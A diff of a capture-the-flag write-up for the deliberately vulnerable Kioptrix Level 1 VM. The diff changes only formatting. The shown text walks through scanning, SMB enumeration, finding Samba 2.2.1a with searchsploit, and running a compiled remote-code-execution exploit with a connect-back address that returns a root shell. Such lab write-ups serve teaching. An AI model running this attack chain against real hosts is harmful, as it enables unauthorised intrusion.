@@ -1,10 +1,10 @@
 # Kioptrix_Level_1 writeup
 After booting the vulnerable vm and connecting it to bridged interface , we scan using
-\
+
 ```bash
 sudo netdiscover -r 10.201.61.14/24
 ```
-\
+
 ```bash
  Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                   
@@ -18,13 +18,13 @@ sudo netdiscover -r 10.201.61.14/24
 ```
 \
 now we scan for open ports using 
-\
+
 ```bash
 rustscan -a 10.201.61.106
 ```
 \
 We see many ports being open
-\
+
 ```bash
 Open 10.201.61.106:22
 Open 10.201.61.106:80
@@ -52,7 +52,7 @@ enum4linux -a 10.201.61.106
 ```
 \
 it gave a lot of info on smb from it 
-\
+
 ```bash
 Server 10.201.61.106 allows sessions using username '', password ''
 
@@ -73,7 +73,7 @@ Reconnecting with SMB1 for workgroup listing.
 ```
 \
 so next i used metasploit's smb version finder 
-\
+
 ```bash
 msf auxiliary(scanner/smb/smb_version) > show options
 
@@ -100,7 +100,7 @@ msf auxiliary(scanner/smb/smb_version) > run
 we find that the version is Samba 2.2.1a
 \
 Now , we check for any vulnerabilities using searchsploit
-\
+
 ```bash
 searchsploit Samba 2.2.1a                                          
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -114,13 +114,13 @@ Samba < 3.6.2 (x86) - Denial of Service (PoC)                                   
 ```
 \
 And we see a remote code execution vuln, so lets try that after compiling
-\
+
 ```
 ./10 -v -b 0 -c 10.201.61.14 10.201.61.106
 ```
 \
 and we get a root shell
-\
+
 ```bash
  ./10 -v -b 0 -c 10.201.61.14 10.201.61.106
 
